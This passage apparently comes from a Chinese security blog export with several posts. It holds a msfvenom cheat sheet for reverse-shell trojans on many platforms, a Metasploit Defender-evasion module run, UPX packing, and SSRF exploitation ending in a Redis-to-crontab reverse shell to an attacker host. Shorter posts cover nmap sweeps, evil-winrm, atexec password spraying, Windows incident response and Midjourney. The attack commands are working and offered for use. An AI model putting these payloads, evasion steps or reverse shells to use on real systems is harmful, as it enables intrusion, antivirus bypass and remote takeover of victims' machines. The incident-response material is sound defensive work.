<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.131 LPORT=12345 --arch x64 --platform windows -f psh-reflection -o test.ps1</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>powershll上线后ctrl+z隐藏后台，和bg一个意思</p>
<h2 id="替换exp中payload"><a href="#替换exp中payload" class="headerlink" title="替换exp中payload"></a>替换exp中payload</h2><p>生成自定义的payload替换掉exp中的内容（使用-v参数指定变量名，还有-b避免出现什么字符）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp -f python -v USER_PAYLOAD -b &quot;\x00\xff&quot; lhost=193.122.122.123 lport=12345</span><br></pre></td></tr></table></figure>

<p><img src="/metasploit%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/ba3f081b5709e0fd48ca3f9862186b0c.png" alt="截图"></p>
<h2 id="免杀模块"><a href="#免杀模块" class="headerlink" title="免杀模块"></a>免杀模块</h2><p>evasion是msf的免杀模块，本质上其实就是混淆</p>
<p><img src="/metasploit%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/63668736a2970a9b6a932c052637669f.png" alt="截图"></p>
<p>命令示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use evasion/windows/windows_defender_exe </span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 193.122.122.123</span><br><span class="line">set lport 12345</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p><img src="/metasploit%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC/a23c5418e01d7e4f18e5ca58fa910ee5.png" alt="截图"></p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>生成Linux木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure>

<p>生成bash木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br></pre></td></tr></table></figure>

<p>生成Python木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br></pre></td></tr></table></figure>

<p>生成PHP木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure>

<p>生成ASP木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>

<p>生成JSP木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure>

<p>生成Perl木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure>

<p>生成exe马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/x86/meterpreter/reverse_http --format exe lhost=192.168.1.131 lport=12345 &gt; msf_12345_http_reverse.exe</span><br></pre></td></tr></table></figure>

<p>对木马进行UPX加壳</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upx shell.exe</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
        <tag>metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>nmap测试大网络空间中存活的主机</title>
    <url>/nmap%E6%B5%8B%E8%AF%95%E5%A4%A7%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E4%B8%AD%E5%AD%98%E6%B4%BB%E7%9A%84%E4%B8%BB%E6%9C%BA/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在做项目的时候由于客户Vlan划分的比较多，所以进行主机探测是一件特别消耗时间的工作，Nmap作为一款强大的探测工具怎么会没有这个功能呢？</p>
<span id="more"></span>

<h2 id="Nmap进行探测"><a href="#Nmap进行探测" class="headerlink" title="Nmap进行探测"></a>Nmap进行探测</h2><h3 id="直接说命令"><a href="#直接说命令" class="headerlink" title="直接说命令"></a>直接说命令</h3><p><code>nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oX nmap_output.xml 192.168.0.0/16</code></p>
<h3 id="命令参数分析"><a href="#命令参数分析" class="headerlink" title="命令参数分析"></a>命令参数分析</h3><p><code>-v</code> ：verbose，详细输出</p>
<p><code>-sn</code> ：ping扫描</p>
<p><code>-PE</code> : 使用ICMP协议发现探测</p>
<p><code>-n</code> ：不做DNS解析</p>
<p><code>–min-hostgroup 1024</code> ：最小分组设置为1024个IP地址，当IP太多时，nmap需要分组，然后串行扫描。</p>
<p><code>–min-parallelism 1024</code> ：<strong>大幅度提高扫描速度的关键参数</strong>，为了充分利用系统和网络资源，我们将探针的数目限定最小为1024，可以理解为并发数。</p>
<p><code>-oX filename.xml</code> ：将结果以XML格式输出，文件名为filename.xml，文件保存的绝对路径在开启nmap时路径下。</p>
<h3 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h3><p>客户现场就是192.168.0.0&#x2F;16划分的Vlan，总耗时4分钟左右。</p>
]]></content>
      <categories>
        <category>安全技巧</category>
      </categories>
      <tags>
        <tag>安全技巧</tag>
        <tag>安全工具</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title>pte知识点</title>
    <url>/pte%E7%9F%A5%E8%AF%86%E7%82%B9/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，您输入的密码错误，请检查后重新输入。" data-whm="抱歉, 当前文章不能被校验, 不过您还是可以看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="b184b6a44d000eb59528d2dfab87bc3021be49bda457c9ad60e5b364701d6136"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>cisp-pte</category>
      </categories>
      <tags>
        <tag>private</tag>
        <tag>ctf</tag>
        <tag>cisp-pte</tag>
      </tags>
  </entry>
  <entry>
    <title>ssrf小结</title>
    <url>/ssrf%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前两天面试时突然问起SSRF，这词咋这么熟悉呢！但是又想不起来具体的内容，面试结束后翻阅文档觉得很遗憾，因为之前有学习过，不过时间长没用忘掉了，特此写一篇文章加深印象！</p>
<span id="more"></span>

<h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>SSRF就是服务器请求伪造(Server-Side Request Forgery)，<strong>从其他服务器获取数据时可能会出现此漏洞</strong>。</p>
<p>通用表现形式为<code>http://127.0.0.1/ssrf.php?url=http://10.0.0.1/test.php</code></p>
<p>正常来说，此页面是在<code>ssrf.php</code>页面中调用<code>10.0.0.1/test.php</code>页面，调用是由<code>127.0.0.1</code>发起的，那么我们可以利用这种特性探测<code>127.0.0.1</code>的内网，对内网进行攻击，或者使用<code>file</code>协议尝试读取<code>etc/passwd</code>。</p>
<h3 id="如何判断无回显的SSRF是否存在？"><a href="#如何判断无回显的SSRF是否存在？" class="headerlink" title="如何判断无回显的SSRF是否存在？"></a>如何判断无回显的SSRF是否存在？</h3><p>可以借助DNSLOG平台检测</p>
<h2 id="利用SSRF"><a href="#利用SSRF" class="headerlink" title="利用SSRF"></a>利用SSRF</h2><p>SSRF常见的利用方式是信息收集方向，因为大部分SSRF造成的危害都不是很严重，所以SSRF经常容易被忽略，这里总结一下常见的利用方式：</p>
<h3 id="FTP协议："><a href="#FTP协议：" class="headerlink" title="FTP协议："></a>FTP协议：</h3><blockquote>
<p>如果此端口开放，则页面始终处于加载状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=ftp://ip:端口/info</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &quot;ftp://ip:端口/info&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="dict协议："><a href="#dict协议：" class="headerlink" title="dict协议："></a>dict协议：</h3><blockquote>
<h4 id="常见dict探测"><a href="#常见dict探测" class="headerlink" title="常见dict探测"></a>常见dict探测</h4><p>利用dict协议获取端口的详细信息，方式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=dict://ip:端口/info</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &quot;dict://ip:端口/info&quot;</span><br></pre></td></tr></table></figure>

<h4 id="利用dict操作redis"><a href="#利用dict操作redis" class="headerlink" title="利用dict操作redis"></a>利用dict操作redis</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/ssrf.php?dict://ip:6379/keys</span><br></pre></td></tr></table></figure>

<p>相当于</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &quot;dict://ip:6379/keys *&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><blockquote>
<p>规则（下划线不可缺少）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCP数据流</span><br></pre></td></tr></table></figure>

<h4 id="gopher获取info"><a href="#gopher获取info" class="headerlink" title="gopher获取info"></a>gopher获取info</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -v &quot;gopher://ip:端口/_info&quot;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>一般存在ssrf的地方大多数都限制了协议类型，仅允许http协议，可以进行一次中转使用<code>head()</code>函数重定向，这样就可以绕过了。</p>
<p><strong>举例：</strong></p>
<blockquote>
<p>发现一处ssrf，但仅允许http协议：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://baidu.com</span><br></pre></td></tr></table></figure>

<p>此时可以在自己的vps(假设地址为10.0.0.1)上创建<code>ssrf.php</code>页面，内容如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location://dict://目标IP:端口/info&quot;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此时访问：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://10.0.0.1/ssrf.php</span><br></pre></td></tr></table></figure>

<p>就可以绕过协议限制了，但是没有回显，只能盲打，可以利用ftp的无限加载特性进行端口扫描，当端口未开放时页面加载速度特别快(网速较好)，当当端口开放时加载速度就会特别慢，直到超时自动断开。</p>
<p>而且有些页面会判断后缀，比如限制后缀是jpg，此时可以继续添加参数绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://localhost/ssrf.php?url=http://10.0.0.1/ssrf.php?data=1.jpg</span><br></pre></td></tr></table></figure>
</blockquote>
<p><strong>另外可以使用[::]来绕过localhost，如[::]:6379</strong></p>
<p><strong>例子2：</strong></p>
<blockquote>
<p>条件：服务器限制传递的url中不允许出现php这三个字符</p>
<p>思路：可以修改vps上apache的配置文件比如全局配置或者<code>.htaccess</code>，使其将jpg文件解析成php即可绕过</p>
</blockquote>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>基于ftp的加载特性，可以根据超时写一个简单的常见端口扫描器：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">portscan</span>(<span class="params">url</span>):</span><br><span class="line">  ports=[<span class="number">3306</span>,<span class="number">3389</span>,<span class="number">80</span>,<span class="number">443</span>,<span class="number">445</span>,<span class="number">21</span>] <span class="comment">#自定义</span></span><br><span class="line">  <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">      url=url+<span class="string">&quot;/ssrf.php?url=http://10.0.0.1/ssrf.php?port=&quot;</span>+port</span><br><span class="line">      resopnse=requests.get(url,timeout=<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&quot;[+]&#123;port&#125; open&quot;</span>.<span class="built_in">format</span>(port=port))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  portscan(<span class="string">&quot;http://127.0.0.1/&quot;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="gopher-getshell"><a href="#gopher-getshell" class="headerlink" title="gopher getshell"></a>gopher getshell</h2><p><strong>思路：</strong></p>
<blockquote>
<p>配合redis服务可以getshell，redis服务一般运行在内网的6379端口，利用ssrf漏洞可以进行内网扫描，如果此端口开放可以尝试getshell，因为redis服务一般运行在内网仅主机可以访问，所以默认是root权限而且没有密码，如果getshell成功那么就是root权限。</p>
<p>步骤：</p>
<p>反弹shell脚本如下，保存成.sh文件执行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">redis-cli flushall</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;\n\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/攻击机地址/端口 0&gt;&amp;1\n\n\n&quot;</span>|redis-cli -x <span class="built_in">set</span> 1</span><br><span class="line">redis-cli -h 受害者地址(127.0.0.1) -p 端口(6379) config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron</span><br><span class="line">redis-cli -h 受害者地址 -p 端口 config <span class="built_in">set</span> dbfilename root</span><br><span class="line">redis-cli -h 受害者地址 -p 端口 save</span><br><span class="line">redis-cli -h 受害者地址 -p 端口 quit</span><br></pre></td></tr></table></figure>

<p>接下来使用socat获取数据包，将6379转发到1234上</p>
<p><code>socat -v tcp-listen:1234,fork tcp-connect:localhost:6379</code></p>
<p>执行反弹shell的脚本，此时会读取到数据流：</p>
<p><img src="/ssrf%E5%B0%8F%E7%BB%93/5564970b3fc8fb487543a6e9fdb4bcfb.png" alt="截图"></p>
<p>将数据流保存，并编码成gopher协议支持的形式：</p>
<p>先舍弃<code>&lt;</code>和<code>&gt;</code>开头的数据，这表示请求和返回，再舍弃掉<code>+OK</code>的数据，表示返回的信息，在剩下的数据中，将<code>\r</code>替换为<code>%0d</code>，将<code>\n</code>替换成<code>%0a</code>，其中的<code>$</code>进行URL编码，此时编码就完成了，如果需要修改反弹的IP和端口，则需要同时修改上面的<code>$62</code>，<code>$62</code>为写入Crontab（计划任务）中的命令长度，转码后类似下图。</p>
<p><img src="/ssrf%E5%B0%8F%E7%BB%93/24c4c5ea398a68c2c4fd7be11099241a.png" alt="截图"></p>
<p>此时payload已经生成了，使用<code>gopher://_</code>+<code>payload</code>发起一次攻击，创建定时反弹shell任务。</p>
</blockquote>
<h2 id="gopher转换工具地址"><a href="#gopher转换工具地址" class="headerlink" title="gopher转换工具地址"></a>gopher转换工具地址</h2><p><a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>ssrf</tag>
        <tag>漏洞原理</tag>
      </tags>
  </entry>
  <entry>
    <title>windows应急响应</title>
    <url>/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/</url>
    <content><![CDATA[<h2 id="开机启动排查"><a href="#开机启动排查" class="headerlink" title="开机启动排查"></a>开机启动排查</h2><ul>
<li><p><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></p>
</li>
<li><p>按下<code>Win徽+R</code> 输入<code>msconfig</code> 选择<code>启动</code>选项卡</p>
</li>
<li><p>任务管理器-启动选项卡</p>
</li>
<li><p>按下<code>Win徽+R</code> 输入<code>regedit</code>查找<code>HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></p>
</li>
</ul>
<span id="more"></span>

<h2 id="temp临时文件检查"><a href="#temp临时文件检查" class="headerlink" title="temp临时文件检查"></a>temp临时文件检查</h2><blockquote>
<p>temp是在c盘下的临时目录，低权限用户也可以使用此文件夹，所以此位置容易被利用。</p>
<p>查看temp文件夹发现是否存在PE文件（exe\dll\sys后缀文件），或者特别大的文件</p>
<p>对可疑文件进行分析<code>www.virustotal.com</code></p>
</blockquote>
<ul>
<li>按下<code>Win徽+R</code> 输入<code>%temp%</code>可以直接打开临时文件夹</li>
<li>旧版系统可以手动打开<code>C:\Documents and setting\Administrator\Local Setting</code></li>
</ul>
<h2 id="浏览器检查"><a href="#浏览器检查" class="headerlink" title="浏览器检查"></a>浏览器检查</h2><p>电脑被黑客入侵后黑客有可能会使用浏览器从危险站点下载木马病毒等，所以分析历史记录、下载记录、cookie信息还是有必要的。</p>
<blockquote>
<p>经典分析工具：</p>
<p>历史记录分析：Browsing History View</p>
<p>Cookie记录分析：IE Cookies View</p>
</blockquote>
<h2 id="文件属性分析"><a href="#文件属性分析" class="headerlink" title="文件属性分析"></a>文件属性分析</h2><blockquote>
<p>右键文件查看文件属性，是否有修改时间早于创建时间的文件。</p>
</blockquote>
<h2 id="最近使用的文件"><a href="#最近使用的文件" class="headerlink" title="最近使用的文件"></a>最近使用的文件</h2><ul>
<li>针对于windows10系统可以在文件夹选项中开启<code>快速访问</code>功能，通过<code>计算机-快速访问</code>查看最近使用的文件。</li>
<li>按下<code>Win徽+R</code> 输入<code>%UserProfile%\Recent</code></li>
</ul>
<h2 id="WebShell查杀"><a href="#WebShell查杀" class="headerlink" title="WebShell查杀"></a>WebShell查杀</h2><ul>
<li><p>在文件中查找关键字<code>eval</code>：<code>find /c /n /i &quot;eval&quot; C:\inetpub\wwwroot\1.asp</code></p>
</li>
<li><p>D盾 选择目录-扫描</p>
</li>
</ul>
<h2 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h2><ul>
<li><p>查看已经建立的连接：<code>netstat -ano | find &quot;ESTABLISH&quot;</code></p>
</li>
<li><p>查看具体PID对应的进程：<code>tasklist /svc | find &quot;PID值&quot;</code></p>
</li>
<li><p>强制关闭进程树：<code>taskkill /PID pid值 /T /F</code></p>
</li>
</ul>
<blockquote>
<p>专业进程分析工具：PSexplore、火绒剑</p>
</blockquote>
<h2 id="计划任务分析"><a href="#计划任务分析" class="headerlink" title="计划任务分析"></a>计划任务分析</h2><ul>
<li><code>schtasks</code>或者<code>at</code>（win10已废弃）命令可以查看计划任务</li>
<li>任务计划程序</li>
</ul>
<blockquote>
<p>Tip：在任务计划程序中添加的任务计划不会在<code>at</code>命令中显示，但是在<code>at</code>命令中添加的任务计划会在任务计划程序中显示。</p>
</blockquote>
<h2 id="后门账号发现和删除"><a href="#后门账号发现和删除" class="headerlink" title="后门账号发现和删除"></a>后门账号发现和删除</h2><ul>
<li><code>net user test$ test /add</code>创建了一个<code>test$</code>用户，此用户因为<code>$</code>符号所以不会被显示在<code>net user</code>命令中。可以通过<code>控制面板-管理工具-计算机管理-本地用户和组</code>查看和管理此类隐藏用户。</li>
<li>对于直接添加在注册表中的后门用户，只能通过查看注册表进行修改和删除，按下<code>Win徽+R</code> 输入<code>regedit</code>，依次展开<code>HKEY_LOCAL_MACHINE-SAM-Domains-Account-Users-Names</code>，如果在<code>Names</code>中发现异常用户，不仅要在Names中删除，还需要在Names的上层目录<code>Users</code>中删除对应位置的权限文件。</li>
</ul>
]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>windows远程管理-WinRm</title>
    <url>/windows%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86-WinRm/</url>
    <content><![CDATA[<h2 id="WinRm介绍"><a href="#WinRm介绍" class="headerlink" title="WinRm介绍"></a>WinRm介绍</h2><p>winRm默认开放端口为5985端口。</p>
<p>Windows远程管理是“WS 管理协议的 Microsoft 实施，该协议是基于标准 SOAP、不受防火墙影响的协议，允许不同供应商的硬件和操作系统相互操作。而微软将其包含在他们的系统中，是为了便于系统管理员在日常工作中，远程管理服务器，或通过脚本同时管理多台服务器，以提高他们的工作效率。</p>
<span id="more"></span>

<p>此程序可在启用此功能的任何Microsoft Windows服务器上使用（通常端口为5985），当然只有在你具有使用凭据和权限时才能使用。因此，我们说它可用于黑客攻击的后利用&#x2F;渗透测试阶段。相对于攻击者来说，这个程序能为他们提供更好更简单易用的功能。当然，系统管理员也可以将其用于合法目的，但其大部分功能都集中于黑客攻击&#x2F;渗透测试。</p>
<br>

<h2 id="evil-winrm使用"><a href="#evil-winrm使用" class="headerlink" title="evil-winrm使用"></a>evil-winrm使用</h2><p><code>evil-winrm</code>是Windows远程管理(WinRM) Shell的终极版本。</p>
<h3 id="帮助信息"><a href="#帮助信息" class="headerlink" title="帮助信息"></a>帮助信息</h3><p>kali内置了evil-winrm，帮助信息如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: evil-winrm -i IP -u USER -s SCRIPTS_PATH -e EXES_PATH [-P PORT] [-p PASS] [-U URL]</span><br><span class="line">    -i, --ip IP                      远程主机IP或主机名（必填）</span><br><span class="line">    -P, --port PORT                  远程主机端口（默认为5985）</span><br><span class="line">    -u, --user USER                  用户名（必填）</span><br><span class="line">    -p, --password PASS              密码</span><br><span class="line">    -s, --scripts PS_SCRIPTS_PATH    Powershell脚本路径（必填）</span><br><span class="line">    -e, --executables EXES_PATH      C#可执行文件路径（必填）</span><br><span class="line">    -U, --url URL                    远程URL端点（默认为/wsman）</span><br><span class="line">    -V, --version                    显示版本信息</span><br><span class="line">    -h, --help                       显示帮助信息</span><br></pre></td></tr></table></figure>

<h3 id="连接远程计算机"><a href="#连接远程计算机" class="headerlink" title="连接远程计算机"></a>连接远程计算机</h3><p>连接成功后会进入交互式终端</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">evil-winrm -i &lt;ip&gt; -u &lt;用户名&gt; -p &lt;密码&gt;</span><br></pre></td></tr></table></figure>

<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">upload &lt;local_path&gt; &lt;remote_path&gt;</span><br></pre></td></tr></table></figure>

<h3 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">download &lt;remote_path&gt; &lt;local_path&gt;</span><br></pre></td></tr></table></figure>

<h3 id="其他使用帮助"><a href="#其他使用帮助" class="headerlink" title="其他使用帮助"></a>其他使用帮助</h3><p><a href="https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</a></p>
]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>安全工具</tag>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title>体验Midjourney作画</title>
    <url>/%E4%BD%93%E9%AA%8CMidjourney%E4%BD%9C%E7%94%BB/</url>
    <content><![CDATA[<p><img src="/%E4%BD%93%E9%AA%8CMidjourney%E4%BD%9C%E7%94%BB/92795181ba9645a02165f0892559d762.png" alt="截图"></p>
<span id="more"></span>

<h2 id="官方指南"><a href="#官方指南" class="headerlink" title="官方指南"></a>官方指南</h2><p>入门指南（加入频道）：</p>
<p><a href="https://midjourney.gitbook.io/docs/">https://midjourney.gitbook.io/docs/</a></p>
<p>附加参数说明：</p>
<p><a href="https://midjourney.gitbook.io/docs/imagine-parameters">https://midjourney.gitbook.io/docs/imagine-parameters</a></p>
<p>新手入门影片：</p>
<p><a href="https://www.youtube.com/watch?v=jrkpMJ323Yo">https://www.youtube.com/watch?v=jrkpMJ323Yo</a></p>
<h2 id="使用简介"><a href="#使用简介" class="headerlink" title="使用简介"></a>使用简介</h2><h3 id="创建子频道"><a href="#创建子频道" class="headerlink" title="创建子频道"></a>创建子频道</h3><p>加入频道后，频道内会有人不断刷屏，而找机器人私聊作图的话需要开通会员</p>
<p>所以我们需要在频道内建立一个子区，在子区中作图</p>
<p><img src="/%E4%BD%93%E9%AA%8CMidjourney%E4%BD%9C%E7%94%BB/d059c6a335592d0ad9d20521c19a8e2d.png" alt="截图"></p>
<h3 id="作图"><a href="#作图" class="headerlink" title="作图"></a>作图</h3><p>免费用户大概有25次作图权限，二次生成的也算哦。</p>
<h4 id="创建初始关键字和参数"><a href="#创建初始关键字和参数" class="headerlink" title="创建初始关键字和参数"></a>创建初始关键字和参数</h4><p>发送<code>/imagine</code>关键字作图</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/imagine prompt:The train drives out the window the dream of the soul is in the cloud</span><br></pre></td></tr></table></figure>

<p><img src="/%E4%BD%93%E9%AA%8CMidjourney%E4%BD%9C%E7%94%BB/2c8789ee07678ff27d21100497f0c087.png" alt="截图"></p>
<p>使用<code>--ar</code>指定图片分辨率和比例，使用<code>--v 3</code>指定版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/imagine prompt:The train drives out the window,the dream of the soul is in the cloud --v 3 --ar 1920:1080</span><br></pre></td></tr></table></figure>

<h4 id="引导"><a href="#引导" class="headerlink" title="引导"></a>引导</h4><p>当进行创作时，会出现2x2的网格图片，图片顺序是：</p>
<p>第一行从左向右分别是1，2</p>
<p>第二行从左向右分别是3，4</p>
<p>通过u1，u2，u3，u4选择图片完成最终的创作（满意，符合预期）</p>
<p>通过v1，v2，v3，v4选择图片进行二次创作（还行，部分符合预期）</p>
<p>通过点击重置按钮，重新生成2x2的图片（不满意，重来）</p>
<p><img src="/%E4%BD%93%E9%AA%8CMidjourney%E4%BD%9C%E7%94%BB/5d163381a6d0d82a40b2bdffacf60aa6.png" alt="截图"></p>
]]></content>
      <categories>
        <category>生活</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>使用atexec进行喷洒攻击</title>
    <url>/%E4%BD%BF%E7%94%A8atexec%E8%BF%9B%E8%A1%8C%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<blockquote>
<p>工具下载地址</p>
<p><a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p>
</blockquote>
<span id="more"></span>

<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>atexec最好需要指定administrator用户，经测试，普通用户以及普通管理用户无法直接执行命令。</p>
<p>atexec首次执行需要执行两次</p>
<p>如下图所示：</p>
<p><img src="/%E4%BD%BF%E7%94%A8atexec%E8%BF%9B%E8%A1%8C%E5%96%B7%E6%B4%92%E6%94%BB%E5%87%BB/4e2092ca6f172b6f4fe7ce482145c6b7.png" alt="截图"></p>
<h3 id="单个传递密码"><a href="#单个传递密码" class="headerlink" title="单个传递密码"></a>单个传递密码</h3><p>域环境下需要指定域名，本地环境下使用点号代替</p>
<p>域环境下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">atexec.exe &lt;domain&gt;/&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>

<p>本地环境下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">atexec.exe ./&lt;username&gt;:&lt;password&gt;@&lt;ip&gt; &quot;&lt;command&gt;&quot;</span><br></pre></td></tr></table></figure>

